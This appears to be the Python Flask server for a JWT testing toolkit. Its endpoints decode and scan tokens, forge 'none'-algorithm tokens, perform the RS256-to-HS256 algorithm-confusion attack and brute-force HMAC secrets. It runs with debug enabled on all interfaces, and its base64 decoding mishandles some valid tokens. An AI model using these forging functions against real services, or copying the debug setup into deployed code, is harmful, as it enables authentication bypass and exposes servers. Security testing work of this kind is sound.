from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import base64
import os
from datetime import datetime, timedelta

# Try to import PyJWT properly
try:
    import jwt
except ImportError:
    print("Error: PyJWT not installed. Run: pip install pyjwt")
    # Provide a minimal implementation to prevent crashes during startup
    class DummyJWT:
        class ExpiredSignatureError(Exception): pass
        class InvalidTokenError(Exception): pass
        
        @staticmethod
        def decode(*args, **kwargs):
            raise DummyJWT.InvalidTokenError("PyJWT not installed")
        
        @staticmethod
        def encode(*args, **kwargs):
            return "dummy.token.signature"
    
    jwt = DummyJWT()

# Try to import the JWT utilities
try:
    from jwt_utils import generate_rsa_key_pair, create_sample_token, create_token_pair
    has_jwt_utils = True
except ImportError:
    print("Warning: jwt_utils module not found. Key generation features will be disabled.")
    has_jwt_utils = False

app = Flask(__name__)
CORS(app)

@app.route('/', methods=['GET'])
def index():
    return jsonify({"status": "healthy", "service": "JWTKit API"})

@app.route('/generate-keys', methods=['POST'])
def generate_keys():
    """
    Generate RSA key pair for JWT signing.
    """
    if not has_jwt_utils:
        return jsonify({"error": "Key generation not available. Make sure cryptography is installed."}), 400
    
    try:
        private_key_pem, public_key_pem = generate_rsa_key_pair()
        
        return jsonify({
            "private_key": private_key_pem,
            "public_key": public_key_pem
        })
    except Exception as e:
        return jsonify({"error": f"Error generating keys: {str(e)}"}), 500

@app.route('/generate-sample-tokens', methods=['GET'])
def generate_sample_tokens():
    """
    Generate sample JWT tokens for testing.
    """
    if not has_jwt_utils:
        return jsonify({"error": "Token generation not available. Make sure jwt_utils is installed."}), 400
    
    try:
        hs256_token, rs256_token, secret, private_key, public_key = create_token_pair()
        
        return jsonify({
            "hs256_token": hs256_token,
            "rs256_token": rs256_token,
            "secret": secret,
            "private_key": private_key,
            "public_key": public_key
        })
    except Exception as e:
        return jsonify({"error": f"Error generating tokens: {str(e)}"}), 500

@app.route('/decode', methods=['POST'])
def decode_token():
    """
    Decode a JWT and return its components.
    """
    data = request.json or {}
    token = data.get('token', '')
    
    try:
        # Split the token into parts
        parts = token.split('.')
        if len(parts) != 3:
            return jsonify({"error": "Invalid JWT format"}), 400
        
        # Decode header and payload
        header_json = base64.b64decode(parts[0] + '=' * (-len(parts[0]) % 4)).decode('utf-8')
        payload_json = base64.b64decode(parts[1] + '=' * (-len(parts[1]) % 4)).decode('utf-8')
        
        header = json.loads(header_json)
        payload = json.loads(payload_json)
        
        return jsonify({
            "header": header,
            "payload": payload,
            "signature": parts[2],
            "is_valid": None  # Validity is unknown without a secret
        })
    except Exception as e:
        return jsonify({"error": f"Error decoding token: {str(e)}"}), 400

@app.route('/verify', methods=['POST'])
def verify_token():
    """
    Verify a JWT signature using the provided secret.
    """
    data = request.json or {}
    token = data.get('token', '')
    secret = data.get('secret', '')
    algorithm = data.get('algorithm') or "HS256"  # Default to HS256 if not specified
    
    try:
        # Verify the token
        decoded = jwt.decode(
            token, 
            secret, 
            algorithms=[algorithm]
        )
        
        return jsonify({
            "valid": True,
            "payload": decoded
        })
    except jwt.ExpiredSignatureError:
        return jsonify({
            "valid": False,
            "error": "Token has expired"
        })
    except jwt.InvalidTokenError as e:
        return jsonify({
            "valid": False,
            "error": f"Invalid token: {str(e)}"
        })

@app.route('/vulnerabilities', methods=['POST'])
def scan_vulnerabilities():
    """
    Scan a JWT for common vulnerabilities and misconfigurations.
    """
    data = request.json or {}
    token = data.get('token', '')
    vulnerabilities = []
    
    try:
        # Split and decode parts
        parts = token.split('.')
        header_json = base64.b64decode(parts[0] + '=' * (-len(parts[0]) % 4)).decode('utf-8')
        payload_json = base64.b64decode(parts[1] + '=' * (-len(parts[1]) % 4)).decode('utf-8')
        
        header = json.loads(header_json)
        payload = json.loads(payload_json)
        
        # Check for algorithm vulnerabilities
        if header.get('alg') == 'none':
            vulnerabilities.append({
                "severity": "high",
                "issue": "None Algorithm",
                "description": "The token uses 'none' algorithm which means signature verification is bypassed."
            })
        
        if header.get('alg', '').startswith('HS'):
            vulnerabilities.append({
                "severity": "info",
                "issue": "HMAC Algorithm",
                "description": "The token uses HMAC which might be vulnerable to brute force if a weak secret is used."
            })
            
        # Check for missing or weak expiration
        if 'exp' not in payload:
            vulnerabilities.append({
                "severity": "medium",
                "issue": "No Expiration",
                "description": "The token does not have an expiration time (exp claim)."
            })
            
        # Check current time against expiration
        if 'exp' in payload:
            exp_time = datetime.fromtimestamp(payload['exp'])
            if exp_time < datetime.now():
                vulnerabilities.append({
                    "severity": "info",
                    "issue": "Expired Token",
                    "description": f"Token expired on {exp_time.isoformat()}"
                })
            elif exp_time > datetime.now() + timedelta(days=30):
                vulnerabilities.append({
                    "severity": "low",
                    "issue": "Long Expiration",
                    "description": "Token has a very long expiration time (>30 days)."
                })
                
        # Check for missing issuer/audience
        if 'iss' not in payload:
            vulnerabilities.append({
                "severity": "low",
                "issue": "No Issuer",
                "description": "Token does not specify an issuer (iss claim)."
            })
            
        if 'aud' not in payload:
            vulnerabilities.append({
                "severity": "low",
                "issue": "No Audience",
                "description": "Token does not specify an audience (aud claim)."
            })
        
        return jsonify({
            "token_info": {
                "header": header,
                "payload": payload
            },
            "vulnerabilities": vulnerabilities,
            "risk_score": len(vulnerabilities),
            "recommendations": [
                "Use RS256 instead of HS256 for better security",
                "Always include expiration time (exp) in tokens",
                "Validate issuer and audience claims"
            ]
        })
    except Exception as e:
        return jsonify({"error": f"Error analyzing token: {str(e)}"}), 400

@app.route('/modify', methods=['POST'])
def modify_token():
    """
    Modify a JWT payload and re-sign it.
    """
    data = request.json or {}
    token = data.get('token', '')
    new_payload = data.get('new_payload', {})
    secret = data.get('secret', '')
    algorithm = data.get('algorithm') or "HS256"
    
    try:
        # First decode the token to extract the header
        parts = token.split('.')
        header_json = base64.b64decode(parts[0] + '=' * (-len(parts[0]) % 4)).decode('utf-8')
        header = json.loads(header_json)
        
        # Use the specified algorithm or the one from the token
        algorithm = algorithm or header.get('alg', 'HS256')
        
        # If the token uses 'none' algorithm, create an unsigned token
        if algorithm.lower() == 'none':
            header['alg'] = 'none'
            
            # Encode header and payload
            header_encoded = base64.b64encode(json.dumps(header).encode()).decode('utf-8').replace('=', '')
            payload_encoded = base64.b64encode(json.dumps(new_payload).encode()).decode('utf-8').replace('=', '')
            
            # Return unsigned token
            return jsonify({
                "modified_token": f"{header_encoded}.{payload_encoded}.",
                "algorithm": "none",
                "warning": "This token has no signature and should only be used for testing."
            })
        
        # For other algorithms, require a secret
        if not secret:
            return jsonify({"error": "Secret is required for signing tokens"}), 400
        
        # Create a new token with the modified payload
        new_token = jwt.encode(
            new_payload,
            secret,
            algorithm=algorithm
        )
        
        return jsonify({
            "modified_token": new_token,
            "algorithm": algorithm
        })
    except Exception as e:
        return jsonify({"error": f"Error modifying token: {str(e)}"}), 400

@app.route('/algorithm-confusion', methods=['POST'])
def algorithm_confusion():
    """
    Attempt an algorithm confusion attack (RS256 to HS256).
    """
    data = request.json or {}
    token = data.get('token', '')
    public_key = data.get('public_key', '')
    
    try:
        # First decode the token to extract parts
        parts = token.split('.')
        header_json = base64.b64decode(parts[0] + '=' * (-len(parts[0]) % 4)).decode('utf-8')
        payload_json = base64.b64decode(parts[1] + '=' * (-len(parts[1]) % 4)).decode('utf-8')
        
        header = json.loads(header_json)
        payload = json.loads(payload_json)
        
        # Verify that the original token uses RS256
        if header.get('alg') != 'RS256':
            return jsonify({
                "success": False,
                "error": "This attack only works on RS256 tokens",
                "original_algorithm": header.get('alg')
            })
        
        # Change the algorithm to HS256
        header['alg'] = 'HS256'
        
        # Create a new token with HS256 using the public key as the HMAC secret
        modified_token = jwt.encode(
            payload,
            public_key,
            algorithm='HS256',
            headers=header
        )
        
        return jsonify({
            "success": True,
            "modified_token": modified_token,
            "attack_type": "Algorithm Confusion (RS256 to HS256)",
            "description": "This attack exploits implementations that don't validate the algorithm type correctly."
        })
    except Exception as e:
        return jsonify({"error": f"Error in algorithm confusion attack: {str(e)}"}), 400

@app.route('/brute-force', methods=['POST'])
def brute_force():
    """
    Attempt to brute force a JWT secret.
    Note: For educational purposes only.
    """
    data = request.json or {}
    token = data.get('token', '')
    wordlist = data.get('wordlist', [])
    
    # This should be implemented with background tasks in a production app
    results = []
    found_secret = None
    
    try:
        parts = token.split('.')
        
        # Try each word in the wordlist
        for word in wordlist[:100]:  # Limit to first 100 for API response time
            try:
                # Try to verify with this secret
                if jwt.decode(token, word, algorithms=["HS256"]):
                    found_secret = word
                    break
            except:
                continue
        
        if found_secret:
            return jsonify({
                "success": True,
                "secret_found": found_secret,
                "message": "Secret found! Token can be forged."
            })
        else:
            return jsonify({
                "success": False,
                "message": "Secret not found in provided wordlist",
                "words_checked": len(wordlist[:100])
            })
    except Exception as e:
        return jsonify({"error": f"Error in brute force attempt: {str(e)}"}), 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True) 